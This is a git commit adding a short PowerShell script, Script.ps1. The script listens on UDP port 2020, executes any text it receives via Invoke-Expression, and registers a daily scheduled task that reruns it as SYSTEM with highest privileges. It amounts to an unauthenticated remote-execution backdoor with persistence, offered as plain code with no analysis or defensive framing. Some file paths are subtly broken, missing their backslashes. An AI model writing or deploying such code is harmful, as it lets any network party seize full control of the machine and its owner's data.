e2a99e38e82e6b77fd1744588836d67949e91f1a
Dark-Miel <91888074+Dark-Miel@users.noreply.github.com>
2023-02-16 20:16:41 +0100

    Add files via upload

---
+++ Script.ps1
@@ -0,0 +1,12 @@
+﻿##Server
+$port=2020
+$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::Any,$port)
+$udpclient=new-Object System.Net.Sockets.UdpClient $port
+$content=$udpclient.Receive([ref]$endpoint)
+[Text.Encoding]::ASCII.GetString($content)  | iex
+$udpclient.Dispose()
+
+$Trigger= New-ScheduledTaskTrigger -At 10:00am -Daily
+$User= "NT AUTHORITYSYSTEM"
+$Action= New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "C:Script.ps1"
+Register-ScheduledTask -TaskName "Script" -Trigger $Trigger -User $User -Action $Action -RunLevel Highest –Force
